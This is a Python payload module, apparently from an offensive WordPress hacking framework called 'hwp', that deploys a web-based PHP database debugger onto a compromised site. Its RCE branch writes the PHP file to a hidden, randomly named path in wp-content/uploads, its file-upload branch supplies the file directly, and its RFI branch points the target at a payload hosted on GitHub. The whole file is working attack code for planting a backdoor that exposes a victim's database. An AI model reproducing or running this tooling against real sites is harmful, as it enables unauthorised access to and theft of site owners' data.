"""
HWP Payload — Database Debugger

Deploys a web-based PHP database debugger to the target.

Delivery methods:
    RCE  — Write debugger via PHP code execution
    AFU  — Provide file content for direct upload
    RFI  — Provide URL to hosted db debugger

Options:
    --path      Upload path (default: random in wp-content/uploads)
"""

import random
import string
from pathlib import Path

from hwp import Payload

_DIR = Path(__file__).parent
PAYLOAD_PHP = (_DIR / "wp-dbdebug.php").read_text(encoding="utf-8")

# Hosted payload URL for RFI delivery
PAYLOAD_RFI_URL = "https://raw.githubusercontent.com/etragardh/hackwp/main/payloads/db_debug/wp-dbdebug.php"


def _rand(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class DBDebug(Payload):
    name = "DB Debug"
    methods = ["RCE", "AFU", "RFI"]
    description = "Deploy web-based database debugger"
    options = [
        {"name": "path", "default": "", "help": "Upload path (blank = random)", "methods": ["RCE"]},
    ]

    def instructions(self):
        if self.method == "RCE":
            path = self.options.get("path", "")
            if not path:
                path = f"wp-content/uploads/.{_rand()}.php"

            self._rce_path = path
            self.info(f"Deploying db debugger to: {path}")

            escaped = PAYLOAD_PHP.replace("\\", "\\\\").replace("'", "\\'")

            php = (
                f"<?php "
                f"$f = ABSPATH . '{path}'; "
                f"@mkdir(dirname($f), 0755, true); "
                f"file_put_contents($f, '{escaped}'); "
                f"echo file_exists($f) ? 'PAYLOAD_DEPLOYED' : 'PAYLOAD_FAILED'; "
                f"?>"
            )
            return [php]

        elif self.method == "AFU":
            self.info("Providing db debugger for upload")
            return [PAYLOAD_PHP]

        elif self.method == "RFI":
            self.info(f"Providing hosted URL: {PAYLOAD_RFI_URL}")
            return [PAYLOAD_RFI_URL]

    def report(self, results):
        for r in results:
            if not r.success:
                self.error("DB Debugger deployment failed")
                continue

            if self.method == "RCE":
                if r.output and "PAYLOAD_DEPLOYED" in str(r.output):
                    self.success("DB Debugger deployed!")
                    self.info(f"Open in browser: {self.target}/{self._rce_path}")
                else:
                    self.error("DB Debugger deployment failed")

            elif self.method in ("AFU", "RFI"):
                if r.url:
                    self.success("DB Debugger uploaded!")
                    self.info(f"Open in browser: {r.url}")
                elif r.path:
                    self.success("DB Debugger uploaded!")
                    self.info(f"Uploaded to: {r.path}")
                else:
                    self.success("DB Debugger uploaded (check exploit output for location)")
